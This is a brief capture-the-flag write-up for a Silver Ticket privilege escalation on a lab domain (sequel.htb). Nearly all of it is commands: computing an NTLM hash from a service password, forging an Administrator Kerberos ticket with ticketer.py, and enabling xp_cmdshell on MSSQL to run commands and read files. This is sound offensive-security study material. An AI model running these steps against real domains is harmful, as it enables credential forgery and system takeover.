# CTF: Silver Ticket - Privilege Escalation

## Attack Scenario

You have a SQL service account and password. You want to access to the SQL with Administrator Service Ticket, so that you can run xp\_cmdshell command to escalate the privilege to SYSTEM.&#x20;

## Practices&#x20;

{% code overflow="wrap" %}
```bash
# Service Account: svc_sql
# Password: REGGIE1234ronnie 

# Create a NTLM hash from a password
iptracej@kali ~/h/Escape> python3
>>> import hashlib
>>> hashlib.new('md4', 'REGGIE1234ronnie '.encode('utf-16le')).digest().hex()
'1443ec19da4dac4ffc953bca1b57b4cf'

# Get Domain SID
getPac.py sequel.htb/sql_svc:REGGIE1234ronnie -targetUser Administrator
sudo ntpdate -u sequel.htb

# Domain SID: S-1-5-21-4078382237-1492182817-2568127209

# Create a Silver Ticket 
# We fake a SPN set to this 
ticketer.py -nthash 1443ec19da4dac4ffc953bca1b57b4cf -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -domain sequel.htb -spn Hahahah/dc.sequel.htb Administrator

# Access to MSSQL 
KRB5CCNAME=Administrator.ccache mssqlclient.py -k administrator@dc.sequel.htb

# MSSQL
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> select x from OpenRowset(BULK 'C:\Users\Administrator\Desktop\root.txt',SINGLE_CLOB) R(x)
```
{% endcode %}
